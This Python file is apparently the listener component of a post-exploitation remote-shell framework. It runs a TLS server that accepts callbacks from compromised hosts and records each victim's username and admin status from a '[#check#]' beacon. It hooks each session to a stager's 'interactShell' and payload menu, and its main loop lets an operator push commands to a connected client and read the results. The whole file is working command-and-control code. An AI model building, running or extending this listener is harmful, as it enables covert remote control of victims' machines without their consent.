import asyncio
import ssl
import threading


class StartAsync(threading.Thread):
    def __init__(self, port=5555):
        threading.Thread.__init__(self)
        self.loop = asyncio.get_event_loop()
        self.port = port
        self.sc = ssl.SSLContext(protocol=ssl.PROTOCOL_TLSv1)
        self.sc.load_cert_chain('server.crt', 'server.key')
        self.sc.set_ciphers('AES256')
        self.server = Server()
        self.setDaemon(True)

    def run(self):
        self.coro = asyncio.start_server(self.server.client_connect,
                                         '0.0.0.0',
                                         port=self.port,
                                         loop=self.loop,
                                         ssl=self.sc
                                         )
        self.listener = self.loop.run_until_complete(self.coro)
        self.loop.run_forever()

    def stop(self):
        self.server.close()
        self.loop.call_soon_threadsafe(self.loop.stop)
        self.join()
        print('Server Stopped')


class Client():
    def __init__(self, clientnumber, addr, writer, reader):
        self.addr = addr
        self.clientnumber = clientnumber
        self.writer = writer
        self.reader = reader
        self.in_buffer = []
        self.out_buffer = []
        self.username = ''
        self.is_admin = ''

    async def receive(self):
        while True:
            data = await self.reader.read(8000)
            data = data.decode()
            if data == '':
                self.close_client()
                return
            else:
                if '[#check#]' in data:
                    self.user_name = "User:" + data.split(':')[0].replace('\x00','').replace('[#check#]','')
                    self.is_admin = "Admin:" + data.split(':')[1].replace('\x00','').replace('[#check#]','')
                    from .menu import clientMenuOptions
                    from .stager import interactShell
                    clientMenuOptions[str(self.clientnumber)] =  {'payloadchoice': None, 'payload': self.addr, 'extrawork': interactShell, 'params': str(self.clientnumber), 'availablemodules':{self.user_name: '', self.is_admin: ''}}
                else:
                    self.in_buffer.append(data)

    async def send(self):
        while True:
            if len(self.out_buffer) > 0:
                data = self.out_buffer.pop()
                self.writer.write(data.encode())
                await self.writer.drain()
            await asyncio.sleep(0.2)

    def close_client(self):
        self.writer.close()
        print("Closing Client {}".format(self.addr))


class Server():
    def __init__(self):
        self.clients = {}
        self.clientnumber = 0

    async def client_connect(self, client_reader, client_writer):
        addr = client_writer.get_extra_info('peername')
        print('Client connected: {}'.format(addr))
        self.clientnumber += 1
        client = Client(self.clientnumber, addr, client_writer, client_reader)
        self.clients[self.clientnumber] = client
        await asyncio.gather(
            client.send(),
            client.receive()

        )

    def close(self):
        for clientnum, client in list(self.clients.items()):
            client.close_client()


if __name__ == '__main__':
    listener = StartAsync()
    listener.start()
    try:
        while True:
            comm = input(': ')
            if comm == 'print':
                if listener.server.clients[1].in_buffer:
                    print(listener.server.clients[1].in_buffer.pop())
            if 'send' in comm:
                listener.server.clients[1].out_buffer.append(comm.split()[1])
    except KeyboardInterrupt:
        listener.stop()
